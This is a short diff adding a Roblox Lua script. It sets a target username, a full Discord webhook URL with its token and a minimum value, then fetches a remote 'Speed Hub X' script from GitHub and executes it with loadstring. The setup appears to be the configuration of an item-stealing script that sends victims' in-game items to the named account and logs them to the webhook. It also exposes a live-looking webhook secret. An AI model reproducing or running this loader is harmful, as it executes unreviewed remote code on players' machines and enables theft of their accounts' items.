@@ -1,0 +1,6 @@
+Username = "Julimae11"
+Webhook"https://discord.com/api/webhooks/1397151079166251088/8bF4sVvhabMHURYFkwq8_sgNkF8Oc44EYvG0MsJjx4dcbUCQrdVH93q7JcrEd0wUWB9V"
+MinimumValue = 1
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
